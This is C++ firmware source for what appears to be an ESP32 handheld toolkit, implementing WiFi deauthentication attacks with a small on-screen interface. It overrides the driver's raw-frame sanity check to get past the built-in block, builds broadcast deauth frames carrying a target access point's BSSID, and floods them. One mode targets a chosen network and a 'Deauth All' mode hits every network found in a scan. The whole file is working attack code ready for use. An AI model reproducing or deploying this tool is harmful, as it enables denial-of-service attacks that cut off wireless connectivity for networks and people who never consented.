#include <WiFi.h>
#include <esp_wifi.h>
#include <drivers/screen.h>
#include <kernel/package.h>
#include <lib/ui.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    if (arg == 31337)
        return 1;
    else
        return 0;
}

void deauth_frame_init(int c);
void send_raw_frame(const uint8_t *frame_buffer, int size);

// Default Deauth Frame
const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00};

uint8_t deauth_frame[26];

void app_wifi_deauth(void *lp_param)
{
    int c = *(int *)lp_param;
    screen.fillScreen(TFT_BLACK);
    status_bar(WiFi.SSID(c) != "" ? WiFi.SSID(c) : WiFi.BSSIDstr(c));
    bottom_bar();

    GridView *output = grid_init(7, 1);
    int output_id = grid_add_output(output, "Packets: 0", TEXT_POSITION_CENTER, 2);

    GridView *info = grid_poly_init(output, 5, 1);
    String wifi_info = "SSID:  " + (WiFi.SSID(c) != "" ? WiFi.SSID(c) : "HIDDEN") + "\n" +
                       "BSSID: " + WiFi.BSSIDstr(c) + "\n" +
                       "RSSI:  " + String(WiFi.RSSI(c)) + "dbm\n" +
                       "Channel:  " + String(WiFi.channel(c)) + "\n";

    grid_add_output(info, wifi_info, TEXT_POSITION_TOP_LEFT, 1);

    GridView *btns = grid_poly_init(info, 3, 1);
    grid_add_button(btns, "Start", 2);
    grid_add_button(btns, "Pause", 2);
    grid_add_button(btns, "Stop", 2);

    WiFi.mode(WIFI_AP);
    WiFi.softAP("F", emptyString, 1, 1, 1, false);
    deauth_frame_init(c);

    bool started = false;
    uint32_t packets = 0;
    uint32_t animation_delay = 0;
    while (1)
    {
        String m_btns = handler(btns);
        if (m_btns == "EXIT")
        {
            delay(200);
            break;
        }

        if (m_btns == "Start")
        {
            started = true;
        }
        else if (m_btns == "Pause")
        {
            started = false;
        }
        else if (m_btns == "Stop")
        {
            started = false;
            break;
        }
        // send packets
        if (started)
        {
            send_raw_frame(deauth_frame, sizeof(deauth_frame));
            packets += 1;
            if (millis() - animation_delay > 300)
            {
                grid_output_write(output, output_id, "Packets: " + String(packets), TEXT_POSITION_CENTER, 2, false);
                animation_delay = millis();
            }
        }
    }

    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);

    grid_deinit(output);
    grid_deinit(btns);
}

void app_wifi_deauth_all(void *lp_param)
{
    int n = 0;
    screen.fillScreen(TFT_BLACK);
    status_bar("Scanning...");
    bottom_bar();

    GridView *wifi_count = grid_init(7, 1);
    n = WiFi.scanNetworks(false, true);
    status_bar();
    int wifi_id = grid_add_output(wifi_count, "APs: " + String(n) + "\nPackets: 0", TEXT_POSITION_CENTER, 2);

    GridView *btns = grid_poly_init(wifi_count, 4, 1);
    grid_add_button(btns, "Re-Scan", 2);
    grid_add_button(btns, "Start", 2);
    grid_add_button(btns, "Pause", 2);
    grid_add_button(btns, "Stop", 2);

    WiFi.mode(WIFI_AP);
    WiFi.softAP("F", emptyString, 1, 1, 1, false);

    bool started = false;
    uint32_t packets = 0;
    uint32_t animation_delay = 0;
    while (1)
    {
        String m_btns = handler(btns);
        if (m_btns == "EXIT")
        {
            delay(200);
            break;
        }

        if (m_btns == "Re-Scan")
        {
            status_bar("Scanning...");
            n = WiFi.scanNetworks(false, true);
            grid_output_write(wifi_count, wifi_id, "APs: " + String(n) + "\nPackets: 0", TEXT_POSITION_CENTER, 2, false);
            status_bar();
        }
        else if (m_btns == "Start")
        {
            started = true;
        }
        else if (m_btns == "Pause")
        {
            started = false;
        }
        else if (m_btns == "Stop")
        {
            started = false;
            break;
        }
        // send packets
        if (started)
        {
            for (int i = 0; i < n; ++i)
            {
                deauth_frame_init(i);
                for (int j = 0; j < 10; ++j)
                {
                    send_raw_frame(deauth_frame, sizeof(deauth_frame));
                    packets += 1;
                }
            }
            if (millis() - animation_delay > 300)
            {
                grid_output_write(wifi_count, wifi_id, "APs: " + String(n) + "\nPackets: " + String(packets), TEXT_POSITION_CENTER, 2, false);
                animation_delay = millis();
            }
        }
    }

    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);

    grid_deinit(wifi_count);
    grid_deinit(btns);
}

void deauth_frame_init(int c)
{
    wifi_ap_record_t *it = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(c);

    esp_err_t err;
    err = esp_wifi_set_channel(it->primary, WIFI_SECOND_CHAN_NONE);

    delay(30);

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], it->bssid, 6);
    memcpy(&deauth_frame[16], it->bssid, 6);
}

void send_raw_frame(const uint8_t *frame_buffer, int size)
{
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    delay(1);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    delay(1);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    delay(1);
}

void app_add_wifi_deauth()
{
    app_add("Deauth", "ToolkitWiFi", app_wifi_deauth);
    app_add("Deauth All", "Wifi", app_wifi_deauth_all);
}
